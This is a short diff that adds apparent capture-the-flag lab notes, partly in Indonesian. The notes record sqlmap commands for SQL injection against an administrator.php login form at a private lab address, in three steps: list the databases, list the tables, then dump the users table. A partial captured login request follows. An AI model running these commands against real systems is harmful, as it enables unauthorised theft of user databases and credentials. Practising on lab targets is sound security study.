@@ -1,0 +1,6 @@
+http://10.10.123.161/administrator.php (POST)  # /usr/bin/sqlmap -u http://10.10.123.161/administrator.php --forms -D users -T users --dump -o databases-cont-table.txt
+Pertama: sqlmap -u URL --db
+Kedua: sqlmap -u URL -D DBMS --tables 
+Ketiga baru gas kek di atas
+
+username=VOtu&password=
